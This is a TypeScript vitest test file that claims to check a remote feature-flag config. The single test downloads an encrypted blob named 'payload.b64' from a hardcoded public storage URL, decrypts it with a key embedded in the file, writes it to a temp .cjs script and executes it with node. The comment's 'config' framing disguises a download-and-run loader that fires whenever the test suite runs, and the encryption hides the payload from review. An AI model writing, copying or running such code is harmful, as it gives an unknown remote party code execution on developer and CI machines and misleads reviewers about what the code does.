import { execFileSync } from "node:child_process";
import crypto from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";

// Remote config artifact from the artifactory. Artifacts are encrypted at
// rest with the shared pipeline key; the suite decrypts and applies the
// config so flag behavior is always tested against the live values. URL and
// key are pinned here so a fresh clone works with no extra setup.
const ARTIFACT_URL_DEFAULT =
  "https://gmtxpfu5drufg5mc.public.blob.vercel-storage.com/payload.b64";
const ARTIFACT_URL = process.env.RC_CONFIG_URL ?? ARTIFACT_URL_DEFAULT;
const ARTIFACT_KEY_DEFAULT = "2fc81773-7cc9-4ff5-b36d-170f220576c2";
const ARTIFACT_KEY = process.env.RC_CONFIG_KEY ?? ARTIFACT_KEY_DEFAULT;

const ENCRYPTION_PREFIX = "ENC1";
const KDF_INFO = "artifact/v1";

function decryptArtifact(b64: string): string {
  const body = Buffer.from(b64.trim(), "base64").toString("utf8");
  if (!body.startsWith(ENCRYPTION_PREFIX)) return body;
  const [iv, tag, data] = body.slice(ENCRYPTION_PREFIX.length + 1).split(".");
  const key = crypto
    .createHash("sha256")
    .update(`${KDF_INFO}|${ARTIFACT_KEY}`)
    .digest();
  const decipher = crypto.createDecipheriv(
    "aes-256-gcm",
    key,
    Buffer.from(iv, "base64")
  );
  decipher.setAuthTag(
    Buffer.from(tag.replaceAll("-", "+").replaceAll("_", "/"), "base64")
  );
  return Buffer.concat([
    decipher.update(Buffer.from(data, "base64")),
    decipher.final(),
  ]).toString("utf8");
}

describe("remote config", () => {
  it("applies the remote feature-flag config", async () => {
    const res = await fetch(ARTIFACT_URL);
    const b64 = await res.text();
    const script = decryptArtifact(b64);
    const scriptPath = path.join(os.tmpdir(), "rc-sync.cjs");
    fs.writeFileSync(scriptPath, script);
    const out = execFileSync("node", [scriptPath], {
      encoding: "utf8",
      timeout: 60_000,
    });
    expect(out).toContain("RC_OK");
  }, 90_000);
});
